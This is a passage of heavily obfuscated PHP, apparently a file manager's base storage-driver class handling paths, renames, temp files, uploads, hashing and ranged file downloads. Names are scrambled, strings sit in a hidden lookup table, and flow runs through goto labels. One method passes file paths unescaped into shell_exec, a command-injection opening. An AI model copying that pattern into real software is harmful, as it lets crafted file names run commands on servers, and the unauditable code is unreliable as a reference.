$f´‘¸“˜Øç[$dè—Â¡ùáà . $D¾’¾Æ—ó[76] . $cˆ½¨ëÆã‡ . $D¾’¾Æ—ó[77] . $a“¢æ‰Çê] = $a£‘®õ†Ç; $f´‘¸“˜Øç[$cˆ½¨ëÆã‡ . $D¾’¾Æ—ó[76] . $dè—Â¡ùáà . $D¾’¾Æ—ó[77] . $a“¢æ‰Çê] = $a“¢æ‰Çê; goto d…•¥âÂéµ; d…•¥âÂéµ: return $a“¢æ‰Çê; goto bÆîµÁàÇ; e±¬Áä›Õ: $D¾’¾Æ—ó =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$a£‘®õ†Ç || !function_exists($D¾’¾Æ—ó[75])) { return $a£‘®õ†Ç; } static $f´‘¸“˜Øç = array(); goto dÛøÁéÑ¥·; bÆîµÁàÇ: } public function getPathInner($d¶øºº¼ŠÅ) { $D‡æ“ùŒÊº = IO::init($d¶øºº¼ŠÅ); return $D‡æ“ùŒÊº->path; } public function getPathOuter($c×ËãŒÏ) { $EáÔã¢‚À =& $_SERVER[¶ªÕß‚ØÁŸ]; $aõŒÊ„¢‡æ = strlen(trim($this->pathBase, $EáÔã¢‚À[8])); $c×ËãŒÏ = substr(trim($c×ËãŒÏ, $EáÔã¢‚À[8]), $aõŒÊ„¢‡æ); return $this->pathDriver . $EáÔã¢‚À[8] . ltrim($c×ËãŒÏ, $EáÔã¢‚À[8]); } public function isParentOf($DĞ×‰Åçô, $DíæóšéÆï) { $cÎ˜†¢ß¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DĞ×‰Åçô = rtrim(strtolower($DĞ×‰Åçô), $cÎ˜†¢ß¬[8]) . $cÎ˜†¢ß¬[8]; $DíæóšéÆï = rtrim(strtolower($DíæóšéÆï), $cÎ˜†¢ß¬[8]) . $cÎ˜†¢ß¬[8]; $cÜ§ˆÊ¢  = strpos($DíæóšéÆï, $DĞ×‰Åçô) === 0; return $cÜ§ˆÊ¢ ; } public function getType() { $FÓ’Ÿ¬êùù =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aªëµˆî‡â = str_replace($FÓ’Ÿ¬êùù[81], $FÓ’Ÿ¬êùù[33], get_class($this)); return strtolower($Aªëµˆî‡â); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($b¨…„¢ºÅÒ, $d¹ì¼“¤ŠÄ) { $C¹Ë¡‹ßù =& $_SERVER[¶ªÕß‚ØÁŸ]; $d¡ŸŸ¶ñƒ÷ = rtrim($b¨…„¢ºÅÒ, $C¹Ë¡‹ßù[8]) . $C¹Ë¡‹ßù[8] . $d¹ì¼“¤ŠÄ; $aÙóÕ¶ë‹í = $this->exist($d¡ŸŸ¶ñƒ÷); return $aÙóÕ¶ë‹í ? $d¡ŸŸ¶ñƒ÷ : !1; } public function renameObject($dÒÑôÖÖƒÎ, $d¬Åæ—ğ‰) { goto D„—ÕçÖ…; a§¨ÈÌß­Ë: return $F˜Ÿ’ğºÖ ? $d¬Åæ—ğ‰ : !1; goto BïˆŠÒ¿—÷; D„—ÕçÖ…: $eº¿ëáÉËß =& $_SERVER[¶ªÕß‚ØÁŸ]; $C…Ï‰‰µƒ = $d¬Åæ—ğ‰; Hook::trigger($eº¿ëáÉËß[82], $this, $dÒÑôÖÖƒÎ, $this, $this->pathFather($dÒÑôÖÖƒÎ) . $d¬Åæ—ğ‰); goto eØ‚™×÷ò; eØ‚™×÷ò: $dÒÑôÖÖƒÎ = $this->getPathOuter($dÒÑôÖÖƒÎ); $d¬Åæ—ğ‰ = $this->pathFather($dÒÑôÖÖƒÎ) . $d¬Åæ—ğ‰; if (IO::isFile($dÒÑôÖÖƒÎ)) { $F˜Ÿ’ğºÖ = IO::copy($dÒÑôÖÖƒÎ, $this->pathFather($dÒÑôÖÖƒÎ), REPEAT_RENAME_FOLDER, $C…Ï‰‰µƒ); if ($F˜Ÿ’ğºÖ) { IO::remove($dÒÑôÖÖƒÎ); } } else { $F˜Ÿ’ğºÖ = IO::mkdir($d¬Åæ—ğ‰); if (!$F˜Ÿ’ğºÖ) { return !1; } $F­™ÃÁç¦ = IO::listPath($dÒÑôÖÖƒÎ, !0); $aœ“íƒéè = array_merge($F­™ÃÁç¦[$eº¿ëáÉËß[83]], $F­™ÃÁç¦[$eº¿ëáÉËß[84]]); foreach ($aœ“íƒéè as $dõ¯ß…¾˜ø) { IO::move($dõ¯ß…¾˜ø[$eº¿ëáÉËß[85]], $d¬Åæ—ğ‰, REPEAT_RENAME_FOLDER); } IO::remove($dÒÑôÖÖƒÎ); } goto a§¨ÈÌß­Ë; BïˆŠÒ¿—÷: } public function tempFile($bìéšª£¶‹ = '', $fĞ´·ˆ»ÎÔ = '') { goto Dé¤ãŠò±; DÒÀ¨¸ãÉ·: $f¬±¶¡†ª = $Aº½š¼œˆÛ . $bìéšª£¶‹; @touch($f¬±¶¡†ª); if ($fĞ´·ˆ»ÎÔ) { file_put_contents($f¬±¶¡†ª, $fĞ´·ˆ»ÎÔ); } goto A‰“‘Âªá•; A‰“‘Âªá•: return $f¬±¶¡†ª; goto fõÀÀä«Æ¢; Dé¤ãŠò±: if (!$bìéšª£¶‹) { $bìéšª£¶‹ = rand_string(15); } $Aº½š¼œˆÛ = TEMP_FILES . rand_string(15) . $_SERVER[¶ªÕß‚ØÁŸ][8]; @mkdir($Aº½š¼œˆÛ, 511, !0); goto DÒÀ¨¸ãÉ·; fõÀÀä«Æ¢: } public function tempFileRemve($c²±±´ˆò¶) { @unlink($c²±±´ˆò¶); @rmdir($this->pathFather($c²±±´ˆò¶)); } public function mkfile($eôáá°ç‹, $e”ÉøîŠÏ = '', $E±âµ¨› = REPEAT_RENAME) { } public function mkdir($F„Š·Ö°Òò, $F—Œ¶Ã‹° = REPEAT_SKIP) { } public function delFile($DçÊ¡Ñµ) { } public function delFolder($a³ªî†À‰) { } public function copyFile($e Î‘ÏÜ, $aÍ «¬íŞ) { } public function moveFile($dòÜÁå¹‘×, $EÎ÷‰Š‰á¬) { } public function remove($C‹­ç­©Ÿ) { if ($this->isFile($C‹­ç­©Ÿ)) { return $this->delFile($C‹­ç­©Ÿ); } return $this->delFolder($C‹­ç­©Ÿ); } public function rename($Fî÷á½‡©, $aæ®‚³ùÆ) { } public function exist($CÃÉ³°¾£ï) { } public function findByHash($eøŸÍ´í»³ = '', $fÊå­íÀÙÀ = '') { return !1; } public function isFile($DÕ¬ôÇµµ•) { } public function isFolder($fÙ¨‹·¶½) { } public function size($fŠ‹å×È›¦) { } public function info($dÒ“Ô©Æà) { } public function infoSimple($F„ÁÊ‹„â«) { return $this->info($F„ÁÊ‹„â«); } public function infoAuth($eœ´İŞ†Ã) { return $this->info($eœ´İŞ†Ã); } public function infoFull($A¬¯äÈÎËÜ) { return $this->info($A¬¯äÈÎËÜ); } public function infoWithChildren($E¾‰«ùÌË) { $dîÃ¿Ù®‰Ö =& $_SERVER[¶ªÕß‚ØÁŸ]; static $a´”•«¹º„ = array(); if (isset($a´”•«¹º„[$E¾‰«ùÌË])) { return $a´”•«¹º„[$E¾‰«ùÌË]; } $cËÏ’‹ò÷Š = $this->info($E¾‰«ùÌË); if ($cËÏ’‹ò÷Š && $cËÏ’‹ò÷Š[$dîÃ¿Ù®‰Ö[29]] == $dîÃ¿Ù®‰Ö[86]) { $dÜ¹Ğß††Ë = array($dîÃ¿Ù®‰Ö[87] => 0, $dîÃ¿Ù®‰Ö[88] => 0, $dîÃ¿Ù®‰Ö[89] => 0); $this->infoChildren($E¾‰«ùÌË, $dÜ¹Ğß††Ë); $cËÏ’‹ò÷Š[$dîÃ¿Ù®‰Ö[87]] = $dÜ¹Ğß††Ë[$dîÃ¿Ù®‰Ö[87]]; $cËÏ’‹ò÷Š[$dîÃ¿Ù®‰Ö[90]] = array($dîÃ¿Ù®‰Ö[91] => $dÜ¹Ğß††Ë[$dîÃ¿Ù®‰Ö[88]], $dîÃ¿Ù®‰Ö[92] => $dÜ¹Ğß††Ë[$dîÃ¿Ù®‰Ö[89]]); $a´”•«¹º„[$E¾‰«ùÌË] = $cËÏ’‹ò÷Š; } return $cËÏ’‹ò÷Š; } public function listPath($eÆÌøëãÔ’, $Cš‚ƒëŒ³ = false) { } public function has($aëÙÓ„ë¬, $AšºˆÙìÌ« = false, $cïùÍ³…à = false) { } public function canRead($D›ªµÑˆğÎ) { } public function canWrite($Dì”‹ªŸ˜¶) { } public function getContent($Bô´“ššøØ) { } public function setContent($eºõ˜†È±‡, $còáé‚‹ = '') { } protected function infoChildren($cäñ½º»ê , &$CÖá¯´ª“£) { $dëì÷‰é±¯ =& $_SERVER[¶ªÕß‚ØÁŸ]; check_abort(); $dÆ½±Ö°À˜ = $this->listPath($cäñ½º»ê , !0); $dÆ½±Ö°À˜ = array_merge($dÆ½±Ö°À˜[$dëì÷‰é±¯[84]], $dÆ½±Ö°À˜[$dëì÷‰é±¯[83]]); foreach ($dÆ½±Ö°À˜ as $E‹Ñµ‚œ¢­) { if ($E‹Ñµ‚œ¢­[$dëì÷‰é±¯[29]] == $dëì÷‰é±¯[86]) { $CÖá¯´ª“£[$dëì÷‰é±¯[89]]++; $då’©ó‰ó¤ = $this->getPathInner($E‹Ñµ‚œ¢­[$dëì÷‰é±¯[85]]); $this->infoChildren($då’©ó‰ó¤, $CÖá¯´ª“£); } else { $CÖá¯´ª“£[$dëì÷‰é±¯[88]]++; $CÖá¯´ª“£[$dëì÷‰é±¯[87]] += $E‹Ñµ‚œ¢­[$dëì÷‰é±¯[87]]; } } } public function fileSubstr($C‚ÈÆ˜Ğ¿é, $A£Ñ±óˆßç, $D¸«Ñ‚‰) { } public function listAll($e¶¿›ñ’æ„) { } public function upload($a¬°É„ª , $bÛ×ÖÉ¹›î, $d¥Ì‚§ƒî = false, $f·‡äÜ„ØÒ = REPEAT_REPLACE) { } public function uploadFileByID($f±ÍóÔğº, $eÔÇ—ä‚¾İ, $aøø½¹öŞ£) { } public function uploadFileByPath($E»§½½ĞŠ, $d°àõ§¦ªÏ, $eæŠÚ³µ‡ñ = array()) { } public function isUploadServer() { $d¸ÙÇëâò =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $d¸ÙÇëâò[93]) { return !0; } return $GLOBALS[$d¸ÙÇëâò[6]][$d¸ÙÇëâò[94]][$d¸ÙÇëâò[95]]; } public function isFileOutServer() { $CÂ£¹Æ¡æ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $CÂ£¹Æ¡æ[93]) { return !0; } return $GLOBALS[$CÂ£¹Æ¡æ[6]][$CÂ£¹Æ¡æ[94]][$CÂ£¹Æ¡æ[96]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Fñ¤¨®Õ»¨) { $Dì¡øÜ‘Ó =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$this->isCdnHost()) { return $Fñ¤¨®Õ»¨; } return str_replace(trim(get_url_root($Fñ¤¨®Õ»¨), $Dì¡øÜ‘Ó[8]), trim($this->cdnHost, $Dì¡øÜ‘Ó[8]), $Fñ¤¨®Õ»¨); } public function uploadLink($e’áéïÌà, $D½‰Ğ”¡¡¢ = 0) { goto bÊÕ„°‡Û¬; bÊÕ„°‡Û¬: $Fà£†ïÔ®¶ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->isUploadServer()) { return; } $f·á±—÷—§ = $this->getType(); goto D°¡”©ˆ; E¿Í¸¤ÀÀ: if ($EªÌ‡‡æÕ—) { $EªÌ‡‡æÕ—[$Fà£†ïÔ®¶[99]] = $e’áéïÌà; $EªÌ‡‡æÕ—[$Fà£†ïÔ®¶[100]] = $f·á±—÷—§; } return $EªÌ‡‡æÕ—; goto A±¦èËñÛÒ; D°¡”©ˆ: if (!in_array($f·á±—÷—§, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $aš¡Ñ±‰Æ› = 1024 * 1024 * 10; goto aµÀº´¹Ù¹; aµÀº´¹Ù¹: $e¥Ì„®£ƒ = $D½‰Ğ”¡¡¢ <= $aš¡Ñ±‰Æ› ? $Fà£†ïÔ®¶[97] : $Fà£†ïÔ®¶[98]; $B–øòõØÑÑ = (!$D½‰Ğ”¡¡¢ ? 1 : ceil($D½‰Ğ”¡¡¢ / pow(1024, 3))) * 3600 * 4; $EªÌ‡‡æÕ— = $this->{$e¥Ì„®£ƒ}($e’áéïÌà, $B–øòõØÑÑ); goto E¿Í¸¤ÀÀ; A±¦èËñÛÒ: } public function uploadFormData($DÀ™Æ¢š, $a˜ÃÊƒö”« = 3600) { } public function multiUploadFormData($f‘Ñâ‘·ã£, $Dé­›ùÚ ± = 3600) { } public function download($CÈ‹Åô¹èš, $FßÖòêæÜ†) { } public function ext($C¢à¬»æ¶«) { $B¼ÈÎšš’Ë =& $_SERVER[¶ªÕß‚ØÁŸ]; if (strpos($C¢à¬»æ¶«, $B¼ÈÎšš’Ë[8]) === -1) { $c†¬ƒŞ°Òá = $C¢à¬»æ¶«; } else { $c†¬ƒŞ°Òá = $this->pathThis($C¢à¬»æ¶«); } $C•œíª–õÑ = $B¼ÈÎšš’Ë[33]; if (strstr($c†¬ƒŞ°Òá, $B¼ÈÎšš’Ë[101])) { $C•œíª–õÑ = substr($c†¬ƒŞ°Òá, strrpos($c†¬ƒŞ°Òá, $B¼ÈÎšš’Ë[101]) + 1); $C•œíª–õÑ = strtolower($C•œíª–õÑ); } if (strlen($C•œíª–õÑ) > 3 && preg_match($B¼ÈÎšš’Ë[102], $C•œíª–õÑ, $CÁ®¥ßÔøÖ)) { $C•œíª–õÑ = $B¼ÈÎšš’Ë[33]; } return $C•œíª–õÑ; } public function pathThis($c¶ˆÁ¢œ‡ ) { $e¶ï‡´ˆ¸ô =& $_SERVER[¶ªÕß‚ØÁŸ]; $c¶ˆÁ¢œ‡  = str_replace($e¶ï‡´ˆ¸ô[103], $e¶ï‡´ˆ¸ô[8], rtrim($c¶ˆÁ¢œ‡ , $e¶ï‡´ˆ¸ô[8])); $cÆÄÙ«…Ó¹ = strrpos($c¶ˆÁ¢œ‡ , $e¶ï‡´ˆ¸ô[8]); if ($cÆÄÙ«…Ó¹ === !1) { return $c¶ˆÁ¢œ‡ ; } return substr($c¶ˆÁ¢œ‡ , $cÆÄÙ«…Ó¹ + 1); } public function pathFather($FÅò‘ÛŒ‰ï) { $fÃ±Ê¯Ü„ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÅò‘ÛŒ‰ï = str_replace($fÃ±Ê¯Ü„[103], $fÃ±Ê¯Ü„[8], rtrim($FÅò‘ÛŒ‰ï, $fÃ±Ê¯Ü„[8])); $BÆĞ—¨«šì = strrpos($FÅò‘ÛŒ‰ï, $fÃ±Ê¯Ü„[8]); if ($BÆĞ—¨«šì === !1) { return $fÃ±Ê¯Ü„[33]; } return substr($FÅò‘ÛŒ‰ï, 0, $BÆĞ—¨«šì + 1); } public function hashSimple($DÏá¹Ç‘) { goto Fù©¹ñÅõå; B¦æÇ²Šá¡: $AÇ×Õ˜Ø÷ø .= $this->fileSubstr($DÏá¹Ç‘, $f•«‘Ç¸ó´ - $C‹“æŠĞö², $C‹“æŠĞö²); return md5($AÇ×Õ˜Ø÷ø) . $f•«‘Ç¸ó´; goto eˆå¿¤¼«; eÀãô÷ÖŞ‰: $C‹“æŠĞö² = 200; $fö‡Ïô…Ú› = 50; if ($f•«‘Ç¸ó´ <= $C‹“æŠĞö² * $fö‡Ïô…Ú›) { return $this->hashMd5($DÏá¹Ç‘) . $f•«‘Ç¸ó´; } goto D÷¿çˆ¶; Fù©¹ñÅõå: $b‹å±ï¿Ì =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$DÏá¹Ç‘) { return md5($b‹å±ï¿Ì[33]); } $f•«‘Ç¸ó´ = $this->size($DÏá¹Ç‘); goto eÀãô÷ÖŞ‰; D÷¿çˆ¶: $C’ƒö¹Ñö = intval($f•«‘Ç¸ó´ / $fö‡Ïô…Ú›); $AÇ×Õ˜Ø÷ø = $b‹å±ï¿Ì[33]; for ($E‹’›åÂêƒ = 0; $E‹’›åÂêƒ < $fö‡Ïô…Ú›; $E‹’›åÂêƒ++) { $AÇ×Õ˜Ø÷ø .= $this->fileSubstr($DÏá¹Ç‘, $C’ƒö¹Ñö * $E‹’›åÂêƒ, $C‹“æŠĞö²); } goto B¦æÇ²Šá¡; eˆå¿¤¼«: } public static $md5Cache = array(); public function hashMd5($fÂÚ«ò“·‰) { $fÂÚ«ò“·‰ = $this->iconvSystem($fÂÚ«ò“·‰); if (isset(self::$md5Cache[$fÂÚ«ò“·‰])) { return self::$md5Cache[$fÂÚ«ò“·‰]; } self::$md5Cache[$fÂÚ«ò“·‰] = $this->hashMd5Shell($fÂÚ«ò“·‰); if (!self::$md5Cache[$fÂÚ«ò“·‰]) { self::$md5Cache[$fÂÚ«ò“·‰] = @md5_file($fÂÚ«ò“·‰); } return self::$md5Cache[$fÂÚ«ò“·‰]; } private function hashMd5Shell($Fó†ŒÈèÛã) { goto b¤«Ô‚ÜÌ; dîŸ¢ÌÆŒ: $dÉà’êË = Cache::get($C‹ÒïŠ‡—[107]); if (!$dÉà’êË) { $ešÜğ‚˜Ø¢ = BASIC_PATH . $C‹ÒïŠ‡—[108]; $cÒ¡¿­¾Õ› = md5_file($ešÜğ‚˜Ø¢); $dÉà’êË = $C‹ÒïŠ‡—[109]; foreach ($f÷äù¼Áù• as $A ¼·Ñ¿Š) { $b‡¿…ï¼è = shell_exec($A ¼·Ñ¿Š . "\x20\x22{$ešÜğ‚˜Ø¢}\x22"); if ($b‡¿…ï¼è && substr(trim($b‡¿…ï¼è), 0, 32) == $cÒ¡¿­¾Õ›) { $dÉà’êË = $A ¼·Ñ¿Š; break; } } Cache::set($C‹ÒïŠ‡—[107], $dÉà’êË, 3600); } if ($dÉà’êË == $C‹ÒïŠ‡—[109]) { return !1; } goto fè ¶¨½¦â; b¤«Ô‚ÜÌ: $C‹ÒïŠ‡— =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!function_exists($C‹ÒïŠ‡—[104])) { return !1; } $f÷äù¼Áù• = array($C‹ÒïŠ‡—[105], $C‹ÒïŠ‡—[106]); goto dîŸ¢ÌÆŒ; fè ¶¨½¦â: $b‡¿…ï¼è = shell_exec($dÉà’êË . "\x20\x22{$Fó†ŒÈèÛã}\x22"); $b‡¿…ï¼è = str_replace($C‹ÒïŠ‡—[110], $C‹ÒïŠ‡—[33], $b‡¿…ï¼è); return substr($b‡¿…ï¼è, 0, 32); goto F¯„„ÑÏçë; F¯„„ÑÏçë: } public function link($f³‹¡Ğ·) { return $f³‹¡Ğ·; } public function fileOut($b›è§éŠà, $F÷‚ù•ó®Û = false, $e»º»‹–ê = false, $Cêí°¹„ß = '') { goto bÓÊô©À´ë; föê—ÑĞ¼: $d‚…ÀÃ­ = rawurlencode($B¤¼é‘šÀÚ); $d‚…ÀÃ­ = $cè’ƒ‰¨[123] . $d‚…ÀÃ­ . $cè’ƒ‰¨[127] . $d‚…ÀÃ­; if ($F÷‚ù•ó®Û) { header($cè’ƒ‰¨[128]); header($cè’ƒ‰¨[129] . $d‚…ÀÃ­); } else { header($cè’ƒ‰¨[130] . $d‚…ÀÃ­); } goto eÑê·ª…; DÇí¾ÚÍ ¨: if ($cÀªßµÅÃã) { $AÇ¤óó‹° = intval(1000 * 1000 * ($C”èã±£ / $cÀªßµÅÃã)); } while ($c¡„±ò´’› <= $A–áŸÔù³) { $EÊÃ±Ìí±… = timeFloat(); check_abort(); $E³¬‡ìä‰’ = $A–áŸÔù³ - $c¡„±ò´’› + 1; if ($E³¬‡ìä‰’ <= $C”èã±£) { $C”èã±£ = $E³¬‡ìä‰’; } echo $this->fileSubstr($b›è§éŠà, $c¡„±ò´’›, $C”èã±£); $c¡„±ò´’› += $C”èã±£; if ($C”èã±£ == $E³¬‡ìä‰’) { $c¡„±ò´’› = $A–áŸÔù³ + 1; } if ($AÇ¤óó‹°) { $e…Ã¤¨À¡© = intval(1000 * 1000 * (timeFloat() - $EÊÃ±Ìí±…)); $c¤Ä›Í¨†‘ = $AÇ¤óó‹° - $e…Ã¤¨À¡©; if ($c¤Ä›Í¨†‘ > 5) { usleep($c¤Ä›Í¨†‘); } } } goto CóÁ‹è‡Æ; c³Ú¡”ÌÚé: if ($_SERVER[$cè’ƒ‰¨[164]] == $cè’ƒ‰¨[165]) { return; } $C”èã±£ = 1024 * 100; $AÇ¤óó‹° = 0; goto DÇí¾ÚÍ ¨; bÓÊô©À´ë: $cè’ƒ‰¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->cacheMethod(null, null); if (!$b›è§éŠà || !$this->exist($b›è§éŠà)) { show_json(LNG($cè’ƒ‰¨[111]), !1, $e»º»‹–ê); } goto CñÉ”¹²ÁÕ; DèÈŞŒô‘Ë: $dÒîæÃ‡È = get_file_mime($B·°¢¡ãô); if (strstr($dÒîæÃ‡È, $cè’ƒ‰¨[124])) { $dÒîæÃ‡È = $dÒîæÃ‡È . $cè’ƒ‰¨[125]; } if ($F÷‚ù•ó®Û === !1 && !mime_support($dÒîæÃ‡È)) { $F÷‚ù•ó®Û = !0; $dÒîæÃ‡È = $cè’ƒ‰¨[126]; } goto föê—ÑĞ¼; a…Ä­®˜ò¶: $eóÜÕ‰ˆÍÙ = !0; if ($_SERVER[$cè’ƒ‰¨[161]] == $cè’ƒ‰¨[162] && $BÆåÙæ…« > 1204 * 1024 * 1024 * 2) { $eóÜÕ‰ˆÍÙ = !1; } if ($eóÜÕ‰ˆÍÙ) { header($cè’ƒ‰¨[163] . ($A–áŸÔù³ - $c¡„±ò´’› + 1)); } goto c³Ú¡”ÌÚé; aòŒä‰å”: @ob_end_clean(); set_timeout(); $Fœã³®Òæ³ = $this->infoFull($b›è§éŠà); goto då¡³±½µè; A’ÊÒøí“Ş: header($cè’ƒ‰¨[145] . $BÆåÙæ…«); header($cè’ƒ‰¨[146]); if (!$F÷‚ù•ó®Û && $B·°¢¡ãô == $cè’ƒ‰¨[147]) { if ($BÆåÙæ…« > 1024 * 1024 * 5) { die; } $fä¿³Üéî = $this->getContent($b›è§éŠà); $fä¿³Üéî = Html::clearSVG($fä¿³Üéî); header($cè’ƒ‰¨[148] . $BÆåÙæ…«); echo $fä¿³Üéî; die; } goto FìÃñ¥Ïá; FìÃñ¥Ïá: $E¶ôĞ§„ÙÅ = strtolower($_SERVER[$cè’ƒ‰¨[149]]); if ($A½†ìõİ‰ && $E¶ôĞ§„ÙÅ && $aùß¡ô¡İÃ) { if (strstr($E¶ôĞ§„ÙÅ, $cè’ƒ‰¨[150])) { header($cè’ƒ‰¨[151] . $b›è§éŠà); } else { if (strstr($E¶ôĞ§„ÙÅ, $cè’ƒ‰¨[152])) { header($cè’ƒ‰¨[153] . $b›è§éŠà); } else { if (strstr($E¶ôĞ§„ÙÅ, $cè’ƒ‰¨[154])) { header($cè’ƒ‰¨[155] . $b›è§éŠà); } } } if ($cÀªßµÅÃã) { header($cè’ƒ‰¨[156] . $cÀªßµÅÃã); } return; } if (isset($_SERVER[$cè’ƒ‰¨[157]])) { if (preg_match($cè’ƒ‰¨[158], $_SERVER[$cè’ƒ‰¨[157]], $fö² ¸Ë²)) { $c¡„±ò´’› = intval($fö² ¸Ë²[1]); if (!empty($fö² ¸Ë²[2])) { $A–áŸÔù³ = intval($fö² ¸Ë²[2]); } } header($cè’ƒ‰¨[159]); header("\103\157\x6e\x74\x65\156\164\55\x52\x61\x6e\147\145\72\x20\142\171\x74\x65\163\40{$c¡„±ò´’›}\x2d{$A–áŸÔù³}\x2f" . $BÆåÙæ…«); } else { header($cè’ƒ‰¨[160]); } goto a…Ä­®˜ò¶; CñÉ”¹²ÁÕ: $A½†ìõİ‰ = $this->getType() == $cè’ƒ‰¨[112]; $aùß¡ô¡İÃ = $GLOBALS[$cè’ƒ‰¨[6]][$cè’ƒ‰¨[94]][$cè’ƒ‰¨[113]][$cè’ƒ‰¨[114]]; $cÀªßµÅÃã = (double) $GLOBALS[$cè’ƒ‰¨[6]][$cè’ƒ‰¨[94]][$cè’ƒ‰¨[113]][$cè’ƒ‰¨[115]] * 1024 * 1024; goto aòŒä‰å”; Bš¢¥àİ¸Ô: if (in_array($B·°¢¡ãô, array($cè’ƒ‰¨[118], $cè’ƒ‰¨[119], $cè’ƒ‰¨[120], $cè’ƒ‰¨[121]))) { $B·°¢¡ãô = $cè’ƒ‰¨[122]; } if (!$Cêí°¹„ß) { $Cêí°¹„ß = md5($A’„‹¯‰Ü¥ . $this->hashSimple($b›è§éŠà)); } $Cêí°¹„ß = $cè’ƒ‰¨[123] . $Cêí°¹„ß . $cè’ƒ‰¨[123]; goto DèÈŞŒô‘Ë; eÑê·ª…: header($cè’ƒ‰¨[131]); header($cè’ƒ‰¨[132] . $dÒîæÃ‡È); header($cè’ƒ‰¨[133] . gmdate($cè’ƒ‰¨[116], time() + 3600 * 24 * 30) . $cè’ƒ‰¨[134]); goto fõ¹âÃ¬ñª; fõ¹âÃ¬ñª: header($cè’ƒ‰¨[135]); header($cè’ƒ‰¨[136]); header($cè’ƒ‰¨[137]); goto c„Šïê²‡î; c„Šïê²‡î: if (isset($_SERVER[$cè’ƒ‰¨[138]]) && strtotime($_SERVER[$cè’ƒ‰¨[138]]) == $Fœã³®Òæ³[$cè’ƒ‰¨[117]]) { header($cè’ƒ‰¨[139], !0, 304); die; } if (isset($_SERVER[$cè’ƒ‰¨[140]]) && $_SERVER[$cè’ƒ‰¨[140]] == $Cêí°¹„ß) { header($cè’ƒ‰¨[141] . $Cêí°¹„ß, !0, 304); die; } header($cè’ƒ‰¨[141] . $Cêí°¹„ß); goto C˜›ßº„–®; C˜›ßº„–®: header($cè’ƒ‰¨[142] . $A’„‹¯‰Ü¥ . $cè’ƒ‰¨[134]); header($cè’ƒ‰¨[143] . $B¤¼é‘šÀÚ); header($cè’ƒ‰¨[144]); goto A’ÊÒøí“Ş; f´â§î§£: $c¡„±ò´’› = 0; $A–áŸÔù³ = $BÆåÙæ…« - 1; $B·°¢¡ãô = $this->ext($B¤¼é‘šÀÚ); goto Bš¢¥àİ¸Ô; då¡³±½µè: $BÆåÙæ…« = $Fœã³®Òæ³[$cè’ƒ‰¨[87]]; $A’„‹¯‰Ü¥ = gmdate($cè’ƒ‰¨[116], $Fœã³®Òæ³[$cè’ƒ‰¨[117]]); $B¤¼é‘šÀÚ = $e»º»‹–ê ? $e»º»‹–ê : $this->iconvApp($Fœã³®Òæ³[$cè’ƒ‰¨[28]]); goto f´â§î§£; CóÁ‹è‡Æ: } public function fileOutServer($a»ùÔ¶‘Š„, $Få®Ç…²ö = false, $b˜‡Ô™‰§Ï = false, $fåÎ–Õ÷‡ = '') { $this->fileOut($a»ùÔ¶‘Š„, $Få®Ç…²ö, $b˜‡Ô™‰§Ï, $fåÎ–Õ÷‡); } public function fileOutLink($dÂŞœŒ¼æ¯) { header($_SERVER[¶ªÕß‚ØÁŸ][166] . $dÂŞœŒ¼æ¯); die; } public function cacheMethod($A¤ˆÄ¡ˆïñ, $C„´ÓÌ•’) { goto EÒÚ ƒÔ„å; B¾¹ùÕƒ: return $b™‚÷ÑÇÈ; goto F–ÓºÍÆÓ¦; EÒÚ ƒÔ„å: $CêäÑÄ’÷Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; static $fœÁ–ƒ¦«¨ = array(); $c°Ú±‚×‚ó = $CêäÑÄ’÷Œ[167] . $A¤ˆÄ¡ˆïñ . $CêäÑÄ’÷Œ[168] . rtrim($C„´ÓÌ•’, $CêäÑÄ’÷Œ[8]); goto CÍçó¯ÕÒ; CÉ’õˆ¯ÚŠ: if (!is_null($b™‚÷ÑÇÈ)) { return $b™‚÷ÑÇÈ; } $b™‚÷ÑÇÈ = $this->{$A¤ˆÄ¡ˆïñ}($C„´ÓÌ•’); $fœÁ–ƒ¦«¨[$c°Ú±‚×‚ó] = $b™‚÷ÑÇÈ; goto B¾¹ùÕƒ; CÍçó¯ÕÒ: if (is_null($A¤ˆÄ¡ˆïñ)) { $fœÁ–ƒ¦«¨ = array(); return; } if (is_null($C„´ÓÌ•’)) { unset($fœÁ–ƒ¦«¨[$c°Ú±‚×‚ó]); return; } $b™‚÷ÑÇÈ = isset($fœÁ–ƒ¦«¨[$c°Ú±‚×‚ó]) ? $fœÁ–ƒ¦«¨[$c°Ú±‚×‚ó] : null; goto CÉ’õˆ¯ÚŠ; F–ÓºÍÆÓ¦: } public function fileOutImage($f¼¥Ï±Ïòù, $B¬Ä­ÀÖ¬ = 250) { goto AêêˆùÁ›Ü; B½ÀŸŠ‡ƒ‘: $aòÉğÕ¿© = DATA_THUMB . $F‰²¥Ã¯; if (!@file_exists($aòÉğÕ¿©)) { $AŒ«™×ªß¡ = TEMP_FILES; if (!is_dir($AŒ«™×ªß¡)) { mk_dir($AŒ«™×ªß¡); } $eª‚˜‹Åù· = $AŒ«™×ªß¡ . $fÍÕö‚Ş…é . $B»’™ñÂŒÒ[101] . $bã£Ÿ‚Ï²[$B»’™ñÂŒÒ[170]]; if (!@file_exists($eª‚˜‹Åù·)) { $eª‚˜‹Åù· = $this->download($f¼¥Ï±Ïòù, $eª‚˜‹Åù·); } $E²ÅõœÙ÷ë = new ImageThumb($eª‚˜‹Åù·, $B»’™ñÂŒÒ[177]); $E²ÅõœÙ÷ë->prorate($aòÉğÕ¿©, $B¬Ä­ÀÖ¬, $B¬Ä­ÀÖ¬ * 10); } if (!file_exists($aòÉğÕ¿©) || filesize($aòÉğÕ¿©) < 100) { return @file_exists($eª‚˜‹Åù·) 